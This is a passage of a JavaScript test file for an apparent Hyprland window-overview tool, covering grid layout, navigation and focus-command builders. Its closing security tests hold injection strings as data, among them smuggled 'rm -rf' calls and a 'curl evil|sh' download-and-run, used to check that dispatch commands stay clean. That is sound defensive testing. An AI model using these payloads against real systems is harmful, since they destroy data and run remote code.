  assert.equal(one.cardW, 1000);
  assert.equal(one.boxH, 625);
  assert.equal(one.cardH, 645);
  assert.deepEqual(one.cells, [{x: 0, y: 77}]);
  for (let n = 1; n <= 20; n++) {
    for (const [w, h] of [[1880, 1100], [3000, 400], [500, 2000], [1280, 1890]]) {
      const g = plain(M.gridLayout(n, w, h, 1.6, 12, 24));
      assert.equal(g.rows, Math.ceil(n / g.cols), 'rows for ' + n);
      assert.ok(g.cardW > 0);
      assertGridSane(g, n, w, h, 12);
    }
  }
});

test('gridLayout ties prefer fewer rows, then the fewer-column layout', () => {
  // 3x2, 4x2 and 5x1 all give 312 px: fewer rows wins.
  const wide = plain(M.gridLayout(5, 1600, 400, 1.6, 10, 0));
  assert.deepEqual([wide.cols, wide.rows, wide.cardW], [5, 1, 312]);
  // 3x2 and 4x2 tie at 312 px (5x1 is 292): same rows, so the balanced 3+2 stays.
  const balanced = plain(M.gridLayout(5, 1500, 400, 1.6, 10, 0));
  assert.deepEqual([balanced.cols, balanced.rows, balanced.cardW], [3, 2, 312]);
});

test('gridLayout returns an empty layout for invalid input', () => {
  const empty = {cols: 0, rows: 0, cardW: 0, boxH: 0, cardH: 0, cells: []};
  const cases = [
    [0, 1000, 800, 1.6, 10, 20], [-3, 1000, 800, 1.6, 10, 20], [NaN, 1000, 800, 1.6, 10, 20],
    [3, 0, 800, 1.6, 10, 20], [3, 1000, -1, 1.6, 10, 20], [3, 1000, 800, 0, 10, 20],
    [3, 1000, 800, -1.6, 10, 20], [3, 1000, 800, NaN, 10, 20], ['3', 1000, 800, 1.6, 10, 20],
    [undefined, undefined, undefined, undefined, undefined, undefined],
    // No room for even a 1 px card.
    [3, 10, 10, 1.6, 50, 20],
  ];
  for (const args of cases) {
    assert.deepEqual(plain(M.gridLayout(...args)), empty, 'for ' + JSON.stringify(args));
  }
  // Missing gap/header default to 0.
  const g = plain(M.gridLayout(2, 1000, 400, 2));
  assert.deepEqual([g.cols, g.rows, g.cardW, g.boxH, g.cardH], [2, 1, 500, 250, 250]);
});

// ---- flattenWindows / initialIndex -----------------------------------------

test('flattenWindows walks cards in order and windows in reading order', () => {
  const cards = build(scenario('stacking'));
  const flat = plain(M.flattenWindows(cards));
  // ws2 render order is [b1, b2, b3, b5, b4]; reading order puts the two
  // (0,0) fullscreen windows first (address tie-break), then b1/b2 (same
  // origin, address tie-break), then the floating b3 further down.
  assert.deepEqual(flat, [
    {card: 0, win: 0, address: '0xa1'},
    {card: 0, win: 1, address: '0xa2'},
    {card: 0, win: 2, address: '0xa3'},
    {card: 1, win: 4, address: '0xb4'},
    {card: 1, win: 3, address: '0xb5'},
    {card: 1, win: 0, address: '0xb1'},
    {card: 1, win: 1, address: '0xb2'},
    {card: 1, win: 2, address: '0xb3'},
  ]);
});

test('flattenWindows entries point back at the right window for the real snapshot', () => {
  const cards = buildReal();
  const flat = M.flattenWindows(cards);
  assert.equal(flat.length, realDrawable.length);
  let lastCard = 0;
  for (const e of flat) {
    assert.ok(e.card >= lastCard, 'cards visited in order');
    lastCard = e.card;
    assert.equal(cards[e.card].windows[e.win].address, e.address);
  }
  const idx = M.initialIndex(flat, realOpts.activeAddress);
  if (realActiveClient) assert.equal(flat[idx].address, M.normalizeAddress(realActiveClient.address));
});

test('flattenWindows tolerates missing cards, windows and rects', () => {
  for (const value of [undefined, null, {}, 'x', [], [null], [{}], [{windows: null}], [{windows: [null, {}]}]]) {
    assert.deepEqual(plain(M.flattenWindows(value)), [], 'for ' + JSON.stringify(value));
  }
  const flat = plain(M.flattenWindows([{windows: [{address: 'B2', rect: {x: 0.5, y: 0}}, {address: '0xa1'}]}]));
  assert.deepEqual(flat, [{card: 0, win: 1, address: '0xa1'}, {card: 0, win: 0, address: '0xb2'}]);
});

test('initialIndex finds the active window in any address format', () => {
  const flat = M.flattenWindows(build(scenario('stacking')));
  assert.equal(M.initialIndex(flat, 'b2'), 6);
  assert.equal(M.initialIndex(flat, '0xB2'), 6);
  assert.equal(M.initialIndex(flat, '0xa1'), 0);
  assert.equal(M.initialIndex(flat, '0xdead'), 0);
  assert.equal(M.initialIndex(flat, ''), 0);
  assert.equal(M.initialIndex(flat, null), 0);
  assert.equal(M.initialIndex(flat, 'not hex'), 0);
  assert.equal(M.initialIndex([], 'b2'), -1);
  assert.equal(M.initialIndex(null, 'b2'), -1);
  assert.equal(M.initialIndex(undefined), -1);
  assert.equal(M.initialIndex([null, {address: 'b2'}], '0xb2'), 1);
});

test('mostRecentAddress picks the drawable client with the lowest focusHistoryID', () => {
  const clients = [
    {address: '0xa1', mapped: true, workspace: {id: 1}, focusHistoryID: 2},
    {address: 'B2', mapped: true, workspace: {id: 2}, focusHistoryID: 0},
    {address: '0xc3', mapped: true, workspace: {id: 3}, focusHistoryID: 1},
  ];
  assert.equal(M.mostRecentAddress(clients), '0xb2');
  // Hidden tabs, unmapped windows and invalid workspaces never win.
  assert.equal(M.mostRecentAddress([
    {address: '0xd4', hidden: true, workspace: {id: 1}, focusHistoryID: 0},
    {address: '0xe5', mapped: false, workspace: {id: 1}, focusHistoryID: 0},
    {address: '0xf6', workspace: {id: -1}, focusHistoryID: 0},
    {address: '0xa1', workspace: {id: 1}, focusHistoryID: 5},
  ]), '0xa1');
  // Negative ids mean "not in history" and lose to any real entry.
  assert.equal(M.mostRecentAddress([
    {address: '0xa1', workspace: {id: 1}, focusHistoryID: -1},
    {address: '0xb2', workspace: {id: 1}, focusHistoryID: 3},
  ]), '0xb2');
  for (const value of [undefined, null, [], [null, {}], [{address: '0xa1', workspace: {id: 1}}]]) {
    assert.equal(M.mostRecentAddress(value), '', 'for ' + JSON.stringify(value));
  }
});

// ---- navigate --------------------------------------------------------------

// 3x3 grid, 100 px apart, indices in reading order.
const GRID = [];
for (let r = 0; r < 3; r++) for (let c = 0; c < 3; c++) GRID.push({x: c * 100, y: r * 100});

test('navigate moves to the neighbour in each direction', () => {
  assert.equal(M.navigate(GRID, 4, 'left'), 3);
  assert.equal(M.navigate(GRID, 4, 'right'), 5);
  assert.equal(M.navigate(GRID, 4, 'up'), 1);
  assert.equal(M.navigate(GRID, 4, 'down'), 7);
  assert.equal(M.navigate(GRID, 0, 'right'), 1);
  assert.equal(M.navigate(GRID, 8, 'up'), 5);
});

test('navigate stays put at the edge and on unknown directions', () => {
  assert.equal(M.navigate(GRID, 0, 'left'), 0);
  assert.equal(M.navigate(GRID, 0, 'up'), 0);
  assert.equal(M.navigate(GRID, 8, 'right'), 8);
  assert.equal(M.navigate(GRID, 8, 'down'), 8);
  assert.equal(M.navigate(GRID, 4, 'sideways'), 4);
  assert.equal(M.navigate(GRID, 4, undefined), 4);
});

test('navigate weights sideways offset double', () => {
  const pts = [{x: 0, y: 0}, {x: 100, y: 60}, {x: 200, y: 0}];
  // Straight ahead at 200 (score 200) beats the nearer diagonal (100 + 2*60 = 220).
  assert.equal(M.navigate(pts, 0, 'right'), 2);
  const near = [{x: 0, y: 0}, {x: 100, y: 40}, {x: 200, y: 0}];
  // 100 + 2*40 = 180 < 200.
  assert.equal(M.navigate(near, 0, 'right'), 1);
});

test('navigate requires more than 1 px of movement and breaks ties by index', () => {
  assert.equal(M.navigate([{x: 0, y: 0}, {x: 1, y: 0}], 0, 'right'), 0, '1 px is not "right"');
  assert.equal(M.navigate([{x: 0, y: 0}, {x: 1.5, y: 0}], 0, 'right'), 1);
  assert.equal(M.navigate([{x: 0, y: 0}, {x: 0, y: 300}], 0, 'right'), 0, 'straight below is not "right"');
  assert.equal(M.navigate([{x: 0, y: 0}, {x: 100, y: 50}, {x: 100, y: -50}], 0, 'right'), 1);
  assert.equal(M.navigate([{x: 100, y: -50}, {x: 0, y: 0}, {x: 100, y: 50}], 1, 'right'), 0);
});

test('navigate handles empty lists, bad indices and bad points', () => {
  assert.equal(M.navigate([], 0, 'left'), -1);
  assert.equal(M.navigate(null, 0, 'left'), -1);
  assert.equal(M.navigate(undefined), -1);
  for (const from of [-1, 9, 1.5, '1', null, undefined, NaN]) {
    assert.equal(M.navigate(GRID, from, 'right'), 0, 'from ' + String(from));
  }
  assert.equal(M.navigate([{x: 0, y: 0}, null, {x: 'a', y: 0}, {}, {x: 50, y: 0}], 0, 'right'), 4);
  assert.equal(M.navigate([null, {x: 50, y: 0}], 0, 'right'), 0, 'invalid origin stays');
});

// ---- stepIndex -------------------------------------------------------------

test('stepIndex wraps in both directions', () => {
  assert.equal(M.stepIndex(5, 0, 1), 1);
  assert.equal(M.stepIndex(5, 4, 1), 0);
  assert.equal(M.stepIndex(5, 0, -1), 4);
  assert.equal(M.stepIndex(5, 2, 7), 4);
  assert.equal(M.stepIndex(5, 2, -12), 0);
  assert.equal(M.stepIndex(5, 3, 0), 3);
  assert.equal(M.stepIndex(1, 0, 1), 0);
  assert.equal(M.stepIndex(1, 0, -1), 0);
});

test('stepIndex starts from either end when nothing is highlighted', () => {
  assert.equal(M.stepIndex(5, -1, 1), 0);
  assert.equal(M.stepIndex(5, -1, -1), 4);
  assert.equal(M.stepIndex(5, -1, 0), 0);
  assert.equal(M.stepIndex(5, 99, 1), 0, 'stale index behaves like none');
  assert.equal(M.stepIndex(5, null, -1), 4);
});

test('stepIndex returns -1 when there is nothing to step through', () => {
  for (const count of [0, -2, NaN, '5', null, undefined]) {
    assert.equal(M.stepIndex(count, 0, 1), -1, 'count ' + String(count));
  }
});

// ---- dispatch strings ------------------------------------------------------

test('focusWindowCmd builds the Lua and legacy focus strings', () => {
  assert.equal(M.focusWindowCmd('0x5cd959cd1920', true), 'hl.dsp.focus({ window = "address:0x5cd959cd1920" })');
  assert.equal(M.focusWindowCmd('5CD959CD1920', false), 'focuswindow address:0x5cd959cd1920');
  assert.equal(M.focusWindowCmd(' 0X5CD959CD1920 ', true), 'hl.dsp.focus({ window = "address:0x5cd959cd1920" })');
  assert.equal(M.focusWindowCmd('5cd959cd1920'), 'focuswindow address:0x5cd959cd1920');
  for (const bad of ['', null, undefined, 'zz', '0x', {}, 'address:0x12']) {
    assert.equal(M.focusWindowCmd(bad, true), '', 'lua for ' + String(bad));
    assert.equal(M.focusWindowCmd(bad, false), '', 'legacy for ' + String(bad));
  }
});

test('focusWorkspaceCmd only targets positive integer ids', () => {
  assert.equal(M.focusWorkspaceCmd(3, true), 'hl.dsp.focus({ workspace = "3" })');
  assert.equal(M.focusWorkspaceCmd(3, false), 'workspace 3');
  assert.equal(M.focusWorkspaceCmd(10), 'workspace 10');
  for (const bad of [0, -1, -98, -1337, 1.5, '3', NaN, Infinity, null, undefined, {}, 2 ** 31, 1e21, 'special:x']) {
    assert.equal(M.focusWorkspaceCmd(bad, true), '', 'lua for ' + String(bad));
    assert.equal(M.focusWorkspaceCmd(bad, false), '', 'legacy for ' + String(bad));
  }
});

test('mostRecentWindow picks the lowest focusHistoryID', () => {
  const card = cardById(build(scenario('stacking')), 2);
  assert.equal(M.mostRecentWindow(card).address, '0xb2');
  assert.equal(M.mostRecentWindow({windows: [{address: '0x1', focusHistoryID: 3}, {address: '0x2'}]}).address, '0x1');
  assert.equal(M.mostRecentWindow({windows: [null, {address: '0x2'}]}).address, '0x2');
  for (const value of [null, undefined, {}, {windows: []}, {windows: null}, {windows: [null]}]) {
    assert.equal(M.mostRecentWindow(value), null, 'for ' + JSON.stringify(value));
  }
});

test('cardActivationCmd falls back to "" when nothing can be focused', () => {
  assert.equal(M.cardActivationCmd(null, true), '');
  assert.equal(M.cardActivationCmd({}, true), '');
  assert.equal(M.cardActivationCmd({id: -98, name: 'special:scratchpad', special: true, windows: []}, true), '');
  assert.equal(M.cardActivationCmd({id: -1337, name: 'web', special: false, windows: []}, false), '');
  assert.equal(M.cardActivationCmd({id: 4, name: '4', special: false, windows: []}, false), 'workspace 4');
  assert.equal(M.cardActivationCmd({id: 4, special: false}, true), 'hl.dsp.focus({ workspace = "4" })');
  // A special card never switches by id, even if its id looks numbered.
  assert.equal(M.cardActivationCmd({id: 4, name: '4', special: true, windows: [{address: '0xab', focusHistoryID: 0}]}, false),
    'focuswindow address:0xab');
});

// ---- security --------------------------------------------------------------

const SAFE_CMD_RE = /^(hl\.dsp\.focus\(\{ window = "address:0x[0-9a-f]+" \}\)|focuswindow address:0x[0-9a-f]+|hl\.dsp\.focus\(\{ workspace = "[1-9][0-9]*" \}\)|workspace [1-9][0-9]*)$/;

test('dispatch strings never carry window-controlled text', () => {
  const evil = '"}) hl.exec_cmd("rm -rf ~") --';
  const s = scenario('named');
  // Named workspaces get hostile names too; only ids and addresses may leak through.
  const rename = ws => (ws.name === 'chat' || ws.name === 'web' ? {...ws, name: ws.name + '" }) hl.exec_cmd("x")'} : ws);
  s.workspaces = s.workspaces.map(rename);
  s.clients = s.clients.map((c, i) => ({
    ...c,
    title: evil + ' ' + i,
    class: 'x" }) hl.dsp.exec_cmd("curl evil|sh") --' + i,
    initialClass: "'; rm -rf / #",
    workspace: rename(c.workspace),
  }));
  const cards = build(s);
  assert.equal(cards.length, 8);
  const commands = [];
  for (const card of cards) {
    for (const lua of [true, false]) {
      commands.push(M.cardActivationCmd(card, lua));
      commands.push(M.focusWorkspaceCmd(card.id, lua));
      for (const w of card.windows) commands.push(M.focusWindowCmd(w.address, lua));
    }
  }
  const nonEmpty = commands.filter(c => c !== '');
  assert.ok(nonEmpty.length > 0);
  for (const cmd of nonEmpty) {
    assert.match(cmd, SAFE_CMD_RE);
    assert.ok(!cmd.includes('exec'), cmd);
    assert.ok(!cmd.includes('rm '), cmd);
  }
});

test('malicious "addresses" never produce a command', () => {
  const evil = [
    '0x12" }) hl.dsp.exec_cmd("rm',
    '0x12"}) hl.exec("x")',
    '12 ; hyprctl dispatch exec rm',
    '0x12\nexec rm',
    "0x12' --",
    'address:0x12',
    '0x12)',
  ];
  for (const address of evil) {
    assert.equal(M.focusWindowCmd(address, true), '', address);
    assert.equal(M.focusWindowCmd(address, false), '', address);
    const card = {id: -98, name: 'special:scratchpad', special: true, windows: [{address, focusHistoryID: 0}]};
    assert.equal(M.cardActivationCmd(card, true), '', 'card with ' + address);
  }
  // And buildOverview drops such clients outright (see synthetic-invalid.json).
  const s = scenario('invalid');
  const all = plain(build(s)).flatMap(c => c.windows).map(w => w.address);
  for (const a of all) assert.match(a, ADDRESS_RE);
});
